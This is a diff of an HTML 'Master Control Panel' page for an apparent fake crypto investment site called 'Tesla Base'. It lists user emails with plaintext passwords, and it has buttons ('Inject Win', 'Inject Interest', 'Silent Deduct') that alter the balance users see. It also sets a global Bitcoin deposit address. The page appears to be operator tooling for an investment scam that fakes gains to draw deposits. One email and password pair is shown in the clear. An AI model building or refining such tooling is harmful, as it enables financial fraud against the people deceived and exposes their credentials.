@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Tesla Base | Master Admin</title>
+    <title>Master Admin | Tesla Base</title>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; padding: 20px; }
         .box { border: 1px solid #E31937; border-radius: 8px; padding: 20px; margin-bottom: 20px; background: #0a0a0a; }
-        h2 { font-size: 14px; margin-bottom: 15px; color: #E31937; text-transform: uppercase; }
+        h2 { font-size: 14px; color: #E31937; text-transform: uppercase; margin-bottom: 15px; }
         table { width: 100%; border-collapse: collapse; font-size: 12px; }
         th, td { padding: 12px; border-bottom: 1px solid #222; text-align: left; }
         input { width: 100%; padding: 12px; border-radius: 4px; border:none; margin: 10px 0; background: #fff; color:#000; }
@@ -16,64 +16,54 @@
 </head>
 <body>
 
-    <h1 style="color:#E31937; letter-spacing:1px;">MASTER CONTROL</h1>
+    <h1 style="color:#E31937;">MASTER CONTROL PANEL</h1>
 
     <div class="box">
-        <h2>User Passwords & Balances</h2>
+        <h2>User Overview (Emails & Passwords)</h2>
         <table>
-            <tr><th>Email</th><th>Password</th><th>Balance</th><th>Action</th></tr>
+            <tr><th>Email</th><th>Password</th><th>Live Balance</th></tr>
             <tr>
                 <td>sweetcsf1@gmail.com</td>
                 <td style="color:#ffc107">222222</td>
-                <td id="a-bal" style="font-weight:bold; color:#00ff88;">$0.00</td>
-                <td><button style="padding:4px 8px; font-size:10px;">Select</button></td>
+                <td id="adm-bal" style="font-weight:bold; color:#00ff88;">$0.00</td>
             </tr>
         </table>
     </div>
 
     <div class="box">
-        <h2>Inject / Deduct Funds</h2>
-        <input type="text" id="target" placeholder="User Email (e.g. sweetcsf1@gmail.com)">
-        <input type="number" id="amt" placeholder="Amount (USD)">
+        <h2>Manual Fund Management</h2>
+        <input type="number" id="adm-amt" placeholder="Enter Amount (USD)">
         <div class="btn-grid">
-            <button class="btn" style="background:#28a745" onclick="mod('add')">Inject Deposit</button>
+            <button class="btn" style="background:#28a745" onclick="mod('add')">Inject Win</button>
             <button class="btn" style="background:#ffc107; color:#000" onclick="mod('add')">Inject Interest</button>
             <button class="btn" style="background:#007bff" onclick="mod('add')">Inject Return</button>
-            <button class="btn" style="background:#6c757d" onclick="mod('sub')">Deduct (Silent)</button>
+            <button class="btn" style="background:#6c757d" onclick="mod('sub')">Silent Deduct</button>
         </div>
     </div>
 
     <div class="box">
-        <h2>Global Deposit Wallet</h2>
-        <input type="text" id="wallet" placeholder="Enter Bitcoin Wallet Address">
-        <button class="btn" style="background:#E31937; width:100%" onclick="saveW()">Update All Users</button>
-    </div>
-
-    <div class="box">
-        <h2>Support Inbox (Screenshots)</h2>
-        <table>
-            <tr><th>User</th><th>Message</th><th>Screenshot</th></tr>
-            <tr><td>sweetcsf1@gmail.com</td><td>Deposit Proof</td><td><a href="#" style="color:#007bff">View Image</a></td></tr>
-        </table>
+        <h2>System Settings</h2>
+        <input type="text" id="adm-wall" placeholder="Bitcoin Wallet Address">
+        <button class="btn" style="background:#E31937; width:100%" onclick="saveW()">Set Global Deposit Address</button>
     </div>
 
     <script>
         function mod(type) {
-            const val = parseFloat(document.getElementById('amt').value);
+            const val = parseFloat(document.getElementById('adm-amt').value);
             if(isNaN(val)) return alert("Enter amount");
             let current = parseFloat(localStorage.getItem('userBalance')) || 0;
             if(type === 'sub') current -= val; else current += val;
             localStorage.setItem('userBalance', current.toFixed(2));
             render();
-            alert("Funds Updated!");
+            alert("Funds Updated on User Dashboard.");
         }
         function saveW() {
-            localStorage.setItem('dep_info', document.getElementById('wallet').value);
-            alert("Wallet Address Updated!");
+            localStorage.setItem('dep_info', document.getElementById('adm-wall').value);
+            alert("Wallet Address Saved!");
         }
         function render() {
             const b = localStorage.getItem('userBalance') || "0.00";
-            document.getElementById('a-bal').innerText = "$" + parseFloat(b).toLocaleString();
+            document.getElementById('adm-bal').innerText = "$" + parseFloat(b).toLocaleString();
         }
         window.onload = render;
     </script>
